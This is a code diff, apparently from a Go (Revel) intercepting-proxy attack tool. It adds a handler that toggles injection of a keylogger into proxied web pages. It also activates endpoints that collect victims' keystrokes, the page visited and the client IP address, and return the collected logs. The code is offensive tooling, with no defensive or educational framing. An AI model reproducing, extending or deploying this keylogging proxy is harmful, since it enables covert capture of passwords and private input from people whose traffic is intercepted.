@@ -6,8 +6,8 @@ import (
 	// "io/ioutil"
 	// "os"
 	// "path/filepath"
-	// "time"
-	// "strings"
+	"time"
+	"strings"
 )
 
 
@@ -143,6 +143,7 @@ func (c App) TriggerBlocks() revel.Result {
 	return c.RenderJson(banned) // Return list of redirects.
 }
 
+//
 func (c App) TriggerWolfPack() revel.Result {
 	if globalWolfPack == false {
 		globalWolfPack = true
@@ -154,6 +155,28 @@ func (c App) TriggerWolfPack() revel.Result {
 	KillProxy()
 	listener = StartSimpleProxy()
 	return c.RenderJson("") // Return list of redirects.
+}
+
+//
+func (c App) TriggerInjection() revel.Result {
+	// Get the replace and result.
+	var trigger string
+	//
+	c.Params.Bind(&trigger, "trigger")
+	//
+	if trigger == "keylogger" {
+		if globalInjectKeyLogger == false {
+			globalInjectKeyLogger = true
+			log.Println(" --- OPTION: Turning on key-logger")
+		} else {
+			globalInjectKeyLogger = false
+			log.Println(" --- OPTION: Turning off key-logger")
+		}
+	}
+	//
+	KillProxy()
+	listener = StartSimpleProxy()
+	return c.RenderJson("")
 }
 
 
@@ -182,29 +205,29 @@ func (c App) TriggerWolfPack() revel.Result {
 // 	return c.RenderJson("")
 // }
 
-// func (c App) GetKeylogs() revel.Result {
-// 	return c.RenderJson(keylogs)
-// }
+func (c App) GetKeylogs() revel.Result {
+	return c.RenderJson(keylogs)
+}
 
-// func (c App) AppendData() revel.Result {
-// 	var d string
-// 	var p string
-// 	c.Params.Bind(&d, "data")
-// 	c.Params.Bind(&p, "page")
-// 	if d != "" {
-// 		var k KeyLog
-// 		k.Page = p
-// 		k.Content = d
-// 		t := time.Now().Local()
-// 		k.Timestamp = t.Format("20060102150405")
-// 		s := strings.Split(c.Request.RemoteAddr, ":")
-// 		ip := s[0]
-// 		k.IP = ip
-// 		keylogs = append(keylogs, k)
-// 		return c.RenderJson("logger updated")
-// 	}
-// 	return c.RenderJson("null")
-// }
+func (c App) AppendData() revel.Result {
+	var d string
+	var p string
+	c.Params.Bind(&d, "data")
+	c.Params.Bind(&p, "page")
+	if d != "" {
+		var k KeyLog
+		k.Page = p
+		k.Content = d
+		t := time.Now().Local()
+		k.Timestamp = t.Format("20060102150405")
+		s := strings.Split(c.Request.RemoteAddr, ":")
+		ip := s[0]
+		k.IP = ip
+		keylogs = append(keylogs, k)
+		return c.RenderJson("logger updated")
+	}
+	return c.RenderJson("null")
+}
 
 // func (c App) GetLocations() revel.Result {
 // 	return c.RenderJson(locations)
